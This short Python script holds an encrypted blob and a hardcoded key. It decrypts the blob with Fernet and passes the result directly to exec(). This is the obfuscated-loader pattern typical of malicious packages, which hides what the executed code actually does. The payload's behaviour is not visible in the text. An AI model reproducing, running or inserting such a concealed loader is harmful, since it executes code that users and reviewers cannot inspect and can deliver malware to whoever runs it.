import base64
from cryptography.fernet import Fernet

payload = b'gAAAAABkEnJ22xH-mciP_AukxIoebp8KDzy7RvBh_yPBcP9ZQGulW61mWzDNCXCQCI4RclwLPH5eeTTw7ThtEB14JnGBDZqsXEZWxLK6fxvyODJ-V-kyLnYkDVPB5sxwyHz-ouWyR2MJiR-dX0UQw1lyHun_R8c7EuvEmhehxyV-3NzVTDB0IJBCqAe_x4BjyNeh_yBdBiVTlAg5M_ekx0aeHLD-tB1oNxeHHFQYHHCcMpiv5L0cVQNrxwwpNrSgvRNf8b2bUwIFoyOlFIwUd4ev0ocgJkYh0g=='

key_str = 'correctstaplecorrectstaplecorrec'
key_base64 = base64.b64encode(key_str.encode())
f = Fernet(key_base64)
plain = f.decrypt(payload)
exec(plain.decode())
